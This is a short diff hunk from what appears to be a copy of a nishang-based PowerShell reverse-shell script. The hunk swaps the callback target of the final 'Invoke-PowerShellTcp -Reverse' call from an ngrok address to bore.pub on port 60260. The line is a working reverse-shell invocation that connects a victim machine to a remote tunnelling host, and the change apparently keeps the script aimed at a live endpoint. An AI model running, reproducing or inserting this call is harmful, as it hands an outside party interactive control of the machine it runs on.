@@ -125,4 +125,4 @@ https://github.com/samratashok/nishang
     }
 }
 
-Invoke-PowerShellTcp -Reverse -IPAddress uncolored-humid-wildfowl.ngrok-free.dev -Port 80
+Invoke-PowerShellTcp -Reverse -IPAddress bore.pub -Port 60260
